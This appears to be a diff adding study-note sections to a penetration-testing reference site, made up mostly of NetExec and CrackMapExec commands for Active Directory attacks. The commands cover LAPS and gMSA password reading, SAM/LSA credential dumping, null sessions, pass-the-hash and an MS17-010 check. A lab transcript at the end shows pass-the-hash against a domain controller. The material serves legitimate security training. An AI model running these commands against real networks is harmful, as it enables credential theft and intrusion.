+Context from the notebook: NetExec has multiple execution methods. Inspect your installed version's  nxc smb -h  and the official guide before forcing  --exec-method ; firewall and endpoint policies can affect each method differently.  NetExec quick reference .
+
+```text
+nxc smb -h
+```
+
+</Accordion>
+
+<Accordion title="ACL / object‑control edges (the escalation bread‑and‑butter)">
+
+### ACL / object‑control edges (the escalation bread‑and‑butter)
+
+**BloodHound: Full Reference**
+
+Context from the notebook: ReadLAPSPassword Read the local admin pw (LAPS) nxc ldap &lt;DC> -u u -p p -M laps  /  bloodyAD get object &lt;comp> --attr ms-Mcs-AdmPwd
+
+```text
+nxc ldap <DC> -u u -p p -M laps
+```
+
+**BloodHound: Full Reference**
+
+Context from the notebook: ReadGMSAPassword Read a gMSA managed password nxc ldap &lt;DC> -u u -p p --gmsa  /  gMSADumper.py
+
+```text
+nxc ldap <DC> -u u -p p --gmsa
+```
+
+</Accordion>
+
+<Accordion title="Group &amp; access edges">
+
+### Group & access edges
+
+**BloodHound: Full Reference**
+
+Context from the notebook: AdminTo You're local admin on that computer evil-winrm / psexec / wmiexec  → dump creds:  nxc smb &lt;host> -u u -p p --sam --lsa
+
+```text
+nxc smb <host> -u u -p p --sam --lsa
+```
+
+</Accordion>
+
+<Accordion title="Troubleshooting log (everything that bit me, and the fix)">
+
+### Troubleshooting log (everything that bit me, and the fix)
+
+**Pass the Certificate: PKINIT and Lab Walkthrough**
+
+Context from the notebook: printerbug.py: No module named 'nxc' You grabbed netexec's  internal  module, not the standalone Clone  dirkjanm/krbrelayx , or use  nxc ... -M coerce_plus
+
+```text
+printerbug.py: No module named 'nxc'
+```
+
+**Pass the Certificate: PKINIT and Lab Walkthrough**
+
+Context from the notebook: printerbug.py: No module named 'nxc' You grabbed netexec's  internal  module, not the standalone Clone  dirkjanm/krbrelayx , or use  nxc ... -M coerce_plus
+
+```text
+nxc ... -M coerce_plus
+```
+
+</Accordion>
+
+<Accordion title="Key Takeaways">
+
+### Key Takeaways
+
+**Pass the Hash from Linux and Windows**
+
+Context from the notebook: The hash's value depends entirely on  where that account is admin  — hunt reuse with  netexec ... --local-auth  and watch for  Pwn3d! .
+
+```text
+netexec ... --local-auth
+```
+
+</Accordion>
+
+<Accordion title="Enforcement in Active Directory">
+
+### Enforcement in Active Directory
+
+**Password Policy Concepts and Remediation**
+
+Context from the notebook: Read the current policy as an attacker with:  net accounts ,  nxc smb &lt;DC> -u u -p p --pass-pol , or  (Get-ADDefaultDomainPasswordPolicy) .
+
+```text
+nxc smb <DC> -u u -p p --pass-pol
+```
+
+</Accordion>
+
+<Accordion title="proxychains config (/etc/proxychains4.conf)">
+
+### proxychains config (/etc/proxychains4.conf)
+
+**Pivoting and File Transfer: Field Reference**
+
+Context from the notebook: Kali uses  /etc/proxychains4.conf  (the  4 ), not  proxychains.conf . Comment out the default Tor  socks4 ... 9050  line. Use  socks5 , not  socks4 , for DNS + reliability. Usage:  proxychains &lt;tool> ... . Add  -q  to silence the chain spam:  proxychains -q nxc ... .
+
+```text
+proxychains -q nxc ...
+```
+
+</Accordion>
+
+<Accordion title="SMB / Windows Enumeration">
+
+### SMB / Windows Enumeration
+
+**Ports, Protocols, and Services by Purpose**
+
+Context from the notebook: crackmapexec Multi-protocol enumeration crackmapexec smb &lt;IP> --shares -u '' -p ''
+
+```text
+crackmapexec smb <IP> --shares -u '' -p ''
+```
+
+</Accordion>
+
+<Accordion title="Quick reference">
+
+### Quick reference
+
+**SMB Enumeration and Shares**
+
+Context from the notebook: First move Null session:  nxc smb &lt;IP> -u '' -p ''  and  smbclient -L //&lt;IP>/ -N
+
+```text
+nxc smb <IP> -u '' -p ''
+```
+
+</Accordion>
+
+<Accordion title="MS17-010 (Eternal Blue)">
+
+### MS17-010 (Eternal Blue)
+
+**Windows Privilege Escalation: Full Checklist**
+
+Context from the notebook: Check the vulnerability with the following nmap script or netexec:  netexec smb 10.10.10.10 -u '' -p '' -d domain -M ms17-010 .
+
+```text
+netexec smb 10.10.10.10 -u '' -p '' -d domain -M ms17-010
+```
+
+</Accordion>
+
+<Accordion title="Where it fits with other tools">
+
+### Where it fits with other tools
+
+**rpcclient: Users, Groups, and Domain Policy**
+
+Context from the notebook: rpcclient  is the manual, surgical option. For bulk automated RPC/SMB enumeration you'd reach for  enum4linux-ng ,  netexec smb --users --shares , or  smbmap  — but  rpcclient  is invaluable when you want a  specific  RPC call or those tools choke. See  Master Protocol & Service Quick Reference  for the SMB tool lineup.
+
+```text
+netexec smb --users --shares
+```
+
+</Accordion>
+
+<Accordion title="Confirming Admin Access to the Domain Controller">
+
+### Confirming Admin Access to the Domain Controller
+
+**Historical AD Vulnerability Labs · older reference**
+
+```shellsession
+grcic550@htb[/htb]$ crackmapexec smb 172.16.5.5 -u administrator -H 88ad09182de639ccc6579eb0849751cf
+
+SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
+SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)
+```
+
+</Accordion>
+
+</AccordionGroup>
